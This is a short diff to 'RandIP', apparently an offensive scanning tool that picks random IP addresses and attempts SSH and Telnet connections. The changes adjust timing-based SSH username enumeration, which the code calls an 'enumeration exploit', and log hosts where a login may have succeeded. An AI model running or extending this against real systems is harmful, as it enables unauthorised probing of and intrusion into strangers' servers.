@@ -1,4 +1,4 @@
-#RandIP 1.2.3 Stable#
+#RandIP 1.2.4 Stable#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys, logging
@@ -267,6 +267,10 @@ def SSHConnect():
 			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
 			print(total)
 			SSH.close()
+			if totaltime >= '0.046875':
+				SSHenum()
+			else:
+				pass
 	except socket.timeout:
 		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
 		g.append(address)
@@ -282,6 +286,11 @@ def SSHConnect():
 	except paramiko.ssh_exception.AuthenticationException:
 		print((paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address))
 		g.append(address)
+		pass
+	except EOFError:
+		print((EOFError, 'May have logged into Server: ', address))
+		SSH.close()
+		f.append(address)
 		pass
 	except KeyboardInterrupt:
 		WriteLog()
@@ -335,7 +344,6 @@ for address in randip():
 			print(('Starting SSH Attempt on %s' % address))
 			if SSHio == 1:
 				SSHConnect()
-				SSHenum()
 			elif SSHio == 0:
 				print('SSH port not open...skipping\n')
 #Custom Exploits
